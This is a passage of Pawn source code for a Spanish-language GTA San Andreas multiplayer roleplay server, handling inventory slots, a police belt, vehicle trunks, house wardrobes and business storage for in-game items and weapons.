	else if(puerta == puertaceldaprision15){SetDynamicObjectRot(puertaceldaprision15, 0.0, 0.0, 180.0);}
	else if(puerta == LSNpuerta1){MoveDynamicObject(LSNpuerta1, 781.8000000,-1384.8000000,12.7000000, 2.0);}
	else if(puerta == LSNpuerta2){MoveDynamicObject(LSNpuerta2, 781.8000000,-1330.3000000,12.7000000, 2.0);}
    return 1;
}

//----------Inventario----------//
forward MostrarInv(playerid); //Muestra inventario al jugador
public MostrarInv(playerid)
{
    ActualizarManos(playerid);
    new dialog[1024], string[128];
	for(new i = 0; i < 8; i++)
	{
		new Bol = PlayerInfo[playerid][pBol][i];
		if(Bol == 0){format(string, sizeof(string), "\n{b0b0b0}#%d: %s (%d)", i+1, ObjetoInfo[Bol][NombreObjeto], PlayerInfo[playerid][pBolCant][i]);}
		else{format(string, sizeof(string), "\n{FFFFFF}#%d: %s {fdfe8b}(%d)", i+1, ObjetoInfo[Bol][NombreObjeto], PlayerInfo[playerid][pBolCant][i]);}
		strcat(dialog, string);
	}
	strcat(dialog, "\n|--------------------------------------|");
	if(PlayerInfo[playerid][pManoDer] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano derecha: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano derecha: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
		strcat(dialog, string);
	}
	if(PlayerInfo[playerid][pManoIzq] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano izquierda: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano izquierda: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
		strcat(dialog, string);
	}
	format(string, sizeof(string), "\n{FFFFFF}Intercambiar objetos de mano");
	strcat(dialog, string);
	ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Inventario", dialog, "Seleccionar", "Cerrar");
	return 1;
}

forward SacarBolsillo(playerid, id); //Saca un objeto del bolsillo
public SacarBolsillo(playerid, id)
{
    ActualizarManos(playerid);
    new Bol = PlayerInfo[playerid][pBol][id];
	new Cant = PlayerInfo[playerid][pBolCant][id];
    if(Bol == 0){SendClientMessage(playerid, Rojo, "* Bolsillo vacío."); return 1;}
    if(PlayerInfo[playerid][pManoDer] == 0) //Si la mano derecha está libre
    {
   	    if(ObjetoInfo[Bol][IDArma] > 0) //Es un arma
		{
			new arma = ObjetoInfo[Bol][IDArma], municion = Cant;
			if(municion > 0){GivePlayerWeapon(playerid, arma, municion);} //Si tiene munición, dar el arma.
		}
		new string[128];
		PlayerInfo[playerid][pManoDer] = Bol;
		PlayerInfo[playerid][pManoDerCant] = Cant;
		PonerObjeto(playerid, 1, Bol);
		PlayerInfo[playerid][pBol][id] = 0;
		PlayerInfo[playerid][pBolCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del bolsillo {fce80c}#%d.", ObjetoInfo[Bol][NombreObjeto], Cant, id+1);
		SendClientMessage(playerid, Blanco, string);
        return 1;
	}
	else if(PlayerInfo[playerid][pManoIzq] == 0) //Si la mano izquierda está libre
	{
	    new string[128];
		PlayerInfo[playerid][pManoIzq] = Bol;
		PlayerInfo[playerid][pManoIzqCant] = Cant;
		PonerObjeto(playerid, 2, Bol);
		PlayerInfo[playerid][pBol][id] = 0;
		PlayerInfo[playerid][pBolCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del bolsillo {fce80c}#%d.", ObjetoInfo[Bol][NombreObjeto], Cant, id+1);
		SendClientMessage(playerid, Blanco, string);
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;
	}
	return 1;
}

forward GuardarBolsillo(playerid, mano); //Guardar un objeto en el bolsillo
public GuardarBolsillo(playerid, mano)
{
    ActualizarManos(playerid);
    if(mano == 1)
    {
        if(PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
		new Mano = PlayerInfo[playerid][pManoDer];
		new Cant = PlayerInfo[playerid][pManoDerCant];
		if(ObjetoInfo[Mano][Guardable] == 0 || ObjetoInfo[Mano][Guardable] == 2){SendClientMessage(playerid, Rojo, "* Este objeto es demasiado grande, no puedes guardarlo en el inventario."); return 1;}
        new string[128];
        new BolsilloLibre;
		for(new x = 0; x < 8; x++) //Coloca el objeto en el primer bolsillo libre que encuentra
		{
			if(PlayerInfo[playerid][pBol][x] == 0)
			{
			    PlayerInfo[playerid][pBol][x] = Mano;
			    PlayerInfo[playerid][pBolCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 1);
			    if(ObjetoInfo[Mano][IDArma] > 0) //Guarda un arma
		        {
					Cant = GetPlayerAmmo(playerid);
					RemovePlayerWeapon(playerid, ObjetoInfo[Mano][IDArma]);
		        }
			    PlayerInfo[playerid][pManoDer] = 0;
			    PlayerInfo[playerid][pManoDerCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el bolsillo {fce80c}#%d.", ObjetoInfo[Mano][NombreObjeto], Cant, x+1);
                SendClientMessage(playerid, Blanco, string);
			    BolsilloLibre = 1;
			    return 1;
			}
		}
		if(BolsilloLibre == 0){SendClientMessage(playerid, Rojo, "* Tienes todos los huecos del inventario ocupados."); return 1;}
	}
	else if(mano == 2)
	{
	    if(PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
		new Mano = PlayerInfo[playerid][pManoIzq];
		new Cant = PlayerInfo[playerid][pManoIzqCant];
		if(ObjetoInfo[Mano][Guardable] == 0 || ObjetoInfo[Mano][Guardable] == 2){SendClientMessage(playerid, Rojo, "* Este objeto es demasiado grande, no puedes guardarlo en el inventario."); return 1;}
		new string[128];
		new BolsilloLibre;
		for(new x = 0; x < 8; x++) //Coloca el objeto en el primer bolsillo libre que encuentra
		{
			if(PlayerInfo[playerid][pBol][x] == 0)
			{
			    PlayerInfo[playerid][pBol][x] = Mano;
			    PlayerInfo[playerid][pBolCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 2);
			    PlayerInfo[playerid][pManoIzq] = 0;
			    PlayerInfo[playerid][pManoIzqCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el bolsillo {fce80c}#%d.", ObjetoInfo[Mano][NombreObjeto], Cant, x+1);
                SendClientMessage(playerid, Blanco, string);
			    BolsilloLibre = 1;
			    return 1;
			}
		}
		if(BolsilloLibre == 0){SendClientMessage(playerid, Rojo, "* Tienes todos los huecos del inventario ocupados."); return 1;}
	}
	return 1;
}
//----------Cinturón LSPD----------//
forward MostrarCint(playerid); //Muestra cinturón al jugador (PD)
public MostrarCint(playerid)
{
    ActualizarManos(playerid);
    new dialog[1024], string[128];
	for(new i = 0; i < 8; i++)
	{
		new Cint = PlayerInfo[playerid][pCint][i];
		if(Cint == 0){format(string, sizeof(string), "\n{b0b0b0}#%d: %s (%d)", i+1, ObjetoInfo[Cint][NombreObjeto], PlayerInfo[playerid][pCintCant][i]);}
		else{format(string, sizeof(string), "\n{FFFFFF}#%d: %s {fdfe8b}(%d)", i+1, ObjetoInfo[Cint][NombreObjeto], PlayerInfo[playerid][pCintCant][i]);}
		strcat(dialog, string);
	}
	strcat(dialog, "\n|--------------------------------------|");
	if(PlayerInfo[playerid][pManoDer] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano derecha: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano derecha: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
		strcat(dialog, string);
	}
	if(PlayerInfo[playerid][pManoIzq] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano izquierda: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano izquierda: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
		strcat(dialog, string);
	}
	format(string, sizeof(string), "\n{FFFFFF}Intercambiar objetos de mano");
	strcat(dialog, string);
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_LIST, "Cinturón", dialog, "Seleccionar", "Cerrar");
	return 1;
}

forward SacarCint(playerid, id); //Saca un objeto del cinturón (PD)
public SacarCint(playerid, id)
{
    ActualizarManos(playerid);
    new Cint = PlayerInfo[playerid][pCint][id];
	new Cant = PlayerInfo[playerid][pCintCant][id];
    if(Cint == 0){SendClientMessage(playerid, Rojo, "* Espacio vacío."); return 1;}
    if(PlayerInfo[playerid][pManoDer] == 0) //Si la mano derecha está libre
    {
   	    if(ObjetoInfo[Cint][IDArma] > 0) //Es un arma
		{
			new arma = ObjetoInfo[Cint][IDArma], municion = Cant;
			if(municion > 0){GivePlayerWeapon(playerid, arma, municion);} //Si tiene munición, dar el arma.
		}
		new string[128];
		PlayerInfo[playerid][pManoDer] = Cint;
		PlayerInfo[playerid][pManoDerCant] = Cant;
		PonerObjeto(playerid, 1, Cint);
		PlayerInfo[playerid][pCint][id] = 0;
		PlayerInfo[playerid][pCintCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del cinturón.", ObjetoInfo[Cint][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
		if(Cint == 38){SendClientMessage(playerid, Blanco, "Pulsa Y para recargar el táser cuando dispares.");}
        return 1;
	}
	else if(PlayerInfo[playerid][pManoIzq] == 0) //Si la mano izquierda está libre
	{
	    new string[128];
		PlayerInfo[playerid][pManoIzq] = Cint;
		PlayerInfo[playerid][pManoIzqCant] = Cant;
		PonerObjeto(playerid, 2, Cint);
		PlayerInfo[playerid][pCint][id] = 0;
		PlayerInfo[playerid][pCintCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del cinturón.", ObjetoInfo[Cint][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;
	}
	return 1;
}

forward GuardarCint(playerid, mano); //Guardar un objeto en el cinturón (PD)
public GuardarCint(playerid, mano)
{
    ActualizarManos(playerid);
    if(mano == 1)
    {
        if(PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
		new Mano = PlayerInfo[playerid][pManoDer];
		new Cant = PlayerInfo[playerid][pManoDerCant];
		if(ObjetoInfo[Mano][Guardable] == 0 && Mano != 3){SendClientMessage(playerid, Rojo, "* No puedes guardar este objeto en el cinturón."); return 1;}
        if(ObjetoInfo[Mano][IDArma] > 0) //Guarda un arma
        {
			Cant = GetPlayerAmmo(playerid);
			RemovePlayerWeapon(playerid, ObjetoInfo[Mano][IDArma]);
        }
        new string[128];
        new CintLibre;
		for(new x = 0; x < 8; x++) //Coloca el objeto en el primer slot libre del cinturón
		{
			if(PlayerInfo[playerid][pCint][x] == 0)
			{
			    PlayerInfo[playerid][pCint][x] = Mano;
			    PlayerInfo[playerid][pCintCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 1);
			    PlayerInfo[playerid][pManoDer] = 0;
			    PlayerInfo[playerid][pManoDerCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el cinturón.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    CintLibre = 1;
			    return 1;
			}
		}
		if(CintLibre == 0){SendClientMessage(playerid, Rojo, "* Tienes todos los huecos del cinturón ocupados."); return 1;}
	}
	else if(mano == 2)
	{
	    if(PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
		new Mano = PlayerInfo[playerid][pManoIzq];
		new Cant = PlayerInfo[playerid][pManoIzqCant];
		if(ObjetoInfo[Mano][Guardable] == 0 && Mano != 3){SendClientMessage(playerid, Rojo, "* No puedes guardar este objeto en el cinturón."); return 1;}
		new string[128];
		new CintLibre;
		for(new x = 0; x < 8; x++) //Coloca el objeto en el primer bolsillo libre que encuentra
		{
			if(PlayerInfo[playerid][pCint][x] == 0)
			{
			    PlayerInfo[playerid][pCint][x] = Mano;
			    PlayerInfo[playerid][pCintCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 2);
			    PlayerInfo[playerid][pManoIzq] = 0;
			    PlayerInfo[playerid][pManoIzqCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el cinturón.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    CintLibre = 1;
			    return 1;
			}
		}
		if(CintLibre == 0){SendClientMessage(playerid, Rojo, "* Tienes todos los huecos del cinturón ocupados."); return 1;}
	}
	return 1;
}
//--------------------//
//----------Maleteros----------//
forward MostrarMaletero(playerid, vehicleid); //Muestra maletero de un vehículo al jugador
public MostrarMaletero(playerid, vehicleid)
{
    if(VehMaletero[vehicleid] == 0){return 1;}
    ActualizarManos(playerid);
    new dialog[1024], string[128];
    for(new i = 0; i < CarInfo[vehicleid][cMaxMaletero]; i++)
	{
		new Bonnet = CarInfo[vehicleid][cMaletero][i];
		if(Bonnet == 0){format(string, sizeof(string), "\n{b0b0b0}#%d: %s (%d)", i+1, ObjetoInfo[Bonnet][NombreObjeto], CarInfo[vehicleid][cMaleteroCant][i]);}
		else{format(string, sizeof(string), "\n{FFFFFF}#%d: %s {fdfe8b}(%d)", i+1, ObjetoInfo[Bonnet][NombreObjeto], CarInfo[vehicleid][cMaleteroCant][i]);}
		strcat(dialog, string);
	}
 	format(string, sizeof(string), "\n{fce80c}|--------------------------------------|");
	strcat(dialog, string);
	if(PlayerInfo[playerid][pManoDer] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano derecha: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano derecha: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
		strcat(dialog, string);
	}
	if(PlayerInfo[playerid][pManoIzq] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano izquierda: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano izquierda: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
		strcat(dialog, string);
	}
	format(string, sizeof(string), "Maletero %s", GetVehicleName(vehicleid));
	ShowPlayerDialog(playerid, 6, DIALOG_STYLE_LIST, string, dialog, "Seleccionar", "Salir");
	return 1;
}

forward SacarMaletero(playerid, vehicleid, id); //Saca un objeto de un maletero
public SacarMaletero(playerid, vehicleid, id)
{
    if(VehMaletero[vehicleid] == 0){return 1;}
    ActualizarManos(playerid);
    new Bonnet = CarInfo[vehicleid][cMaletero][id];
	new Cant = CarInfo[vehicleid][cMaleteroCant][id];
    if(Bonnet == 0){SendClientMessage(playerid, Rojo, "* Espacio vacío."); return 1;}
    if(PlayerInfo[playerid][pManoDer] == 0) //Si la mano derecha está libre
    {
   	    if(ObjetoInfo[Bonnet][IDArma] > 0) //Es un arma
		{
			new arma = ObjetoInfo[Bonnet][IDArma], municion = Cant;
			if(municion > 0){GivePlayerWeapon(playerid, arma, municion);} //Si tiene munición, dar el arma.
		}
		new string[128];
		PlayerInfo[playerid][pManoDer] = Bonnet;
		PlayerInfo[playerid][pManoDerCant] = Cant;
		PonerObjeto(playerid, 1, Bonnet);
		CarInfo[vehicleid][cMaletero][id] = 0;
		CarInfo[vehicleid][cMaleteroCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del maletero.", ObjetoInfo[Bonnet][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
		VehMaleteroPlayer[playerid] = 0;
		if(Bonnet == 38){SendClientMessage(playerid, Blanco, "Pulsa Y para recargar el táser cuando dispares.");}
        return 1;
	}
	else if(PlayerInfo[playerid][pManoIzq] == 0) //Si la mano izquierda está libre
	{
	    new string[128];
		PlayerInfo[playerid][pManoIzq] = Bonnet;
		PlayerInfo[playerid][pManoIzqCant] = Cant;
		PonerObjeto(playerid, 2, Bonnet);
		CarInfo[vehicleid][cMaletero][id] = 0;
		CarInfo[vehicleid][cMaleteroCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del maletero.", ObjetoInfo[Bonnet][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
		VehMaleteroPlayer[playerid] = 0;
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;
	}
	return 1;
}

forward GuardarMaletero(playerid, vehicleid, mano); //Guardar un objeto en el maletero de un vehículo
public GuardarMaletero(playerid, vehicleid, mano)
{
    if(VehMaletero[vehicleid] == 0){return 1;}
    ActualizarManos(playerid);
    if(mano == 1)
    {
        if(PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
		new Mano = PlayerInfo[playerid][pManoDer];
		new Cant = PlayerInfo[playerid][pManoDerCant];
        if(ObjetoInfo[Mano][IDArma] > 0) //Guarda un arma
        {
			Cant = GetPlayerAmmo(playerid);
			RemovePlayerWeapon(playerid, ObjetoInfo[Mano][IDArma]);
        }
        new string[128];
        new BonnetLibre;
		for(new x = 0; x < CarInfo[vehicleid][cMaxMaletero]; x++) //Coloca el objeto en el primer slot libre del maletero
		{
			if(CarInfo[vehicleid][cMaletero][x] == 0)
			{
			    CarInfo[vehicleid][cMaletero][x] = Mano;
			    CarInfo[vehicleid][cMaleteroCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 1);
			    PlayerInfo[playerid][pManoDer] = 0;
			    PlayerInfo[playerid][pManoDerCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el maletero.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    BonnetLibre = 1;
			    VehMaleteroPlayer[playerid] = 0;
			    return 1;
			}
		}
		if(BonnetLibre == 0){SendClientMessage(playerid, Rojo, "* Todos los huecos del maletero están ocupados."); return 1;}
	}
	else if(mano == 2)
	{
	    if(PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
		new Mano = PlayerInfo[playerid][pManoIzq];
		new Cant = PlayerInfo[playerid][pManoIzqCant];
		new string[128];
		new BonnetLibre;
		for(new x = 0; x < CarInfo[vehicleid][cMaxMaletero]; x++) //Coloca el objeto en el primer slot libre que encuentra
		{
			if(CarInfo[vehicleid][cMaletero][x] == 0)
			{
			    CarInfo[vehicleid][cMaletero][x] = Mano;
			    CarInfo[vehicleid][cMaleteroCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 2);
			    PlayerInfo[playerid][pManoIzq] = 0;
			    PlayerInfo[playerid][pManoIzqCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el maletero.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    BonnetLibre = 1;
			    VehMaleteroPlayer[playerid] = 0;
			    return 1;
			}
		}
		if(BonnetLibre == 0){SendClientMessage(playerid, Rojo, "* Todos los huecos del maletero están ocupados."); return 1;}
	}
	return 1;
}
//--------------------//
//----------Armarios----------//
forward MostrarArmario(playerid, casa); //Muestra armario de una casa al jugador
public MostrarArmario(playerid, casa)
{
    ActualizarManos(playerid);
    new dialog[1024], string[128];
    for(new i = 0; i < 10; i++)
	{
		new ArmarioObj = HouseInfo[casa][hArmario][i];
		if(ArmarioObj == 0){format(string, sizeof(string), "\n{b0b0b0}#%d: %s (%d)", i+1, ObjetoInfo[ArmarioObj][NombreObjeto], HouseInfo[casa][hArmarioCant][i]);}
		else{format(string, sizeof(string), "\n{FFFFFF}#%d: %s {fdfe8b}(%d)", i+1, ObjetoInfo[ArmarioObj][NombreObjeto], HouseInfo[casa][hArmarioCant][i]);}
		strcat(dialog, string);
	}
 	format(string, sizeof(string), "\n{fce80c}|--------------------------------------|");
	strcat(dialog, string);
	if(PlayerInfo[playerid][pManoDer] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano derecha: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano derecha: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
		strcat(dialog, string);
	}
	if(PlayerInfo[playerid][pManoIzq] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano izquierda: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano izquierda: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
		strcat(dialog, string);
	}
	ShowPlayerDialog(playerid, 20, DIALOG_STYLE_LIST, "Armario", dialog, "Seleccionar", "Salir");
	return 1;
}

forward SacarArmario(playerid, casa, id); //Saca un objeto de un armario
public SacarArmario(playerid, casa, id)
{
    if(casa == 0){return 1;}
    ActualizarManos(playerid);
    new ArmarioObj = HouseInfo[casa][hArmario][id];
	new Cant = HouseInfo[casa][hArmarioCant][id];
    if(ArmarioObj == 0){SendClientMessage(playerid, Rojo, "* Espacio vacío."); return 1;}
    if(PlayerInfo[playerid][pManoDer] == 0) //Si la mano derecha está libre
    {
   	    if(ObjetoInfo[ArmarioObj][IDArma] > 0) //Es un arma
		{
			new arma = ObjetoInfo[ArmarioObj][IDArma], municion = Cant;
			if(municion > 0){GivePlayerWeapon(playerid, arma, municion);} //Si tiene munición, dar el arma.
		}
		new string[128];
		PlayerInfo[playerid][pManoDer] = ArmarioObj;
		PlayerInfo[playerid][pManoDerCant] = Cant;
		PonerObjeto(playerid, 1, ArmarioObj);
		HouseInfo[casa][hArmario][id] = 0;
		HouseInfo[casa][hArmarioCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del armario.", ObjetoInfo[ArmarioObj][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
		if(ArmarioObj == 38){SendClientMessage(playerid, Blanco, "Pulsa Y para recargar el táser cuando dispares.");}
        return 1;
	}
	else if(PlayerInfo[playerid][pManoIzq] == 0) //Si la mano izquierda está libre
	{
	    new string[128];
		PlayerInfo[playerid][pManoIzq] = ArmarioObj;
		PlayerInfo[playerid][pManoIzqCant] = Cant;
		PonerObjeto(playerid, 2, ArmarioObj);
		HouseInfo[casa][hArmario][id] = 0;
		HouseInfo[casa][hArmarioCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del armario.", ObjetoInfo[ArmarioObj][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;
	}
	return 1;
}

forward GuardarArmario(playerid, casa, mano); //Guardar un objeto en el armario de una casa
public GuardarArmario(playerid, casa, mano)
{
    if(casa == 0){return 1;}
    ActualizarManos(playerid);
    if(mano == 1)
    {
        if(PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
		new Mano = PlayerInfo[playerid][pManoDer];
		new Cant = PlayerInfo[playerid][pManoDerCant];
        if(ObjetoInfo[Mano][IDArma] > 0) //Guarda un arma
        {
			Cant = GetPlayerAmmo(playerid);
			RemovePlayerWeapon(playerid, ObjetoInfo[Mano][IDArma]);
        }
        new string[128];
        new ArmarioLibre;
		for(new x = 0; x < 10; x++) //Coloca el objeto en el primer slot libre del maletero
		{
			if(HouseInfo[casa][hArmario][x] == 0)
			{
			    HouseInfo[casa][hArmario][x] = Mano;
			    HouseInfo[casa][hArmarioCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 1);
			    PlayerInfo[playerid][pManoDer] = 0;
			    PlayerInfo[playerid][pManoDerCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el armario.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    ArmarioLibre = 1;
			    return 1;
			}
		}
		if(ArmarioLibre == 0){SendClientMessage(playerid, Rojo, "* Todos los huecos del armario están ocupados."); return 1;}
	}
	else if(mano == 2)
	{
	    if(PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
		new Mano = PlayerInfo[playerid][pManoIzq];
		new Cant = PlayerInfo[playerid][pManoIzqCant];
		new string[128];
		new ArmarioLibre;
		for(new x = 0; x < 10; x++) //Coloca el objeto en el primer slot libre que encuentra
		{
			if(HouseInfo[casa][hArmario][x] == 0)
			{
   				HouseInfo[casa][hArmario][x] = Mano;
			    HouseInfo[casa][hArmarioCant][x] = Cant;
			    RemovePlayerAttachedObject(playerid, 2);
			    PlayerInfo[playerid][pManoIzq] = 0;
			    PlayerInfo[playerid][pManoIzqCant] = 0;
			    format(string, sizeof(string), "* Guardas un/a {fce80c}%s (%d) {FFFFFF}en el armario.", ObjetoInfo[Mano][NombreObjeto], Cant);
                SendClientMessage(playerid, Blanco, string);
			    ArmarioLibre = 1;
			    return 1;
			}
		}
		if(ArmarioLibre == 0){SendClientMessage(playerid, Rojo, "* Todos los huecos del armario están ocupados."); return 1;}
	}
	return 1;
}
//--------------------//
//----------Almacenes----------//
forward MostrarAlmacen(playerid, nego); //Muestra almacén de un local al jugador
public MostrarAlmacen(playerid, nego)
{
    ActualizarManos(playerid);
    new dialog[1024], string[128];
    for(new i = 0; i < NegoInfo[nego][nMaxAlmacen]; i++)
	{
		new AlmacenObj = NegoInfo[nego][nAlmacen][i];
		if(AlmacenObj == 0){format(string, sizeof(string), "\n{b0b0b0}#%d: %s (%d)", i+1, ObjetoInfo[AlmacenObj][NombreObjeto], NegoInfo[nego][nAlmacenCant][i]);}
		else{format(string, sizeof(string), "\n{FFFFFF}#%d: %s {fdfe8b}(%d)", i+1, ObjetoInfo[AlmacenObj][NombreObjeto], NegoInfo[nego][nAlmacenCant][i]);}
		strcat(dialog, string);
	}
 	format(string, sizeof(string), "\n{fce80c}|--------------------------------------|");
	strcat(dialog, string);
	if(PlayerInfo[playerid][pManoDer] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano derecha: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano derecha: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
		strcat(dialog, string);
	}
	if(PlayerInfo[playerid][pManoIzq] == 0)
	{
		format(string, sizeof(string), "\n{b0b0b0}Mano izquierda: Nada");
		strcat(dialog, string);
	}
	else
	{
		format(string, sizeof(string), "\n{FFFFFF}Mano izquierda: %s {fdfe8b}(%d)", ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
		strcat(dialog, string);
	}
	ShowPlayerDialog(playerid, 21, DIALOG_STYLE_LIST, "Almacén", dialog, "Seleccionar", "Salir");
	return 1;
}

forward SacarAlmacen(playerid, nego, id); //Saca un objeto de un almacén
public SacarAlmacen(playerid, nego, id)
{
    if(nego == 0){return 1;}
    ActualizarManos(playerid);
    new AlmacenObj = NegoInfo[nego][nAlmacen][id];
	new Cant = NegoInfo[nego][nAlmacenCant][id];
    if(AlmacenObj == 0){SendClientMessage(playerid, Rojo, "* Espacio vacío."); return 1;}
    if(PlayerInfo[playerid][pManoDer] == 0) //Si la mano derecha está libre
    {
   	    if(ObjetoInfo[AlmacenObj][IDArma] > 0) //Es un arma
		{
			new arma = ObjetoInfo[AlmacenObj][IDArma], municion = Cant;
			if(municion > 0){GivePlayerWeapon(playerid, arma, municion);} //Si tiene munición, dar el arma.
		}
		new string[128];
		PlayerInfo[playerid][pManoDer] = AlmacenObj;
		PlayerInfo[playerid][pManoDerCant] = Cant;
		PonerObjeto(playerid, 1, AlmacenObj);
		NegoInfo[nego][nAlmacen][id] = 0;
		NegoInfo[nego][nAlmacenCant][id] = 0;
		format(string, sizeof(string), "* Sacas un/a {fce80c}%s (%d) {FFFFFF}del armario.", ObjetoInfo[AlmacenObj][NombreObjeto], Cant);
		SendClientMessage(playerid, Blanco, string);
		if(AlmacenObj == 38){SendClientMessage(playerid, Blanco, "Pulsa Y para recargar el táser cuando dispares.");}
        return 1;
	}
	else if(PlayerInfo[playerid][pManoIzq] == 0) //Si la mano izquierda está libre
	{
	    new string[128];
		PlayerInfo[playerid][pManoIzq] = AlmacenObj;
		PlayerInfo[playerid][pManoIzqCant] = Cant;
		PonerObjeto(playerid, 2, AlmacenObj);
		NegoInfo[nego][nAlmacen][id] = 0;
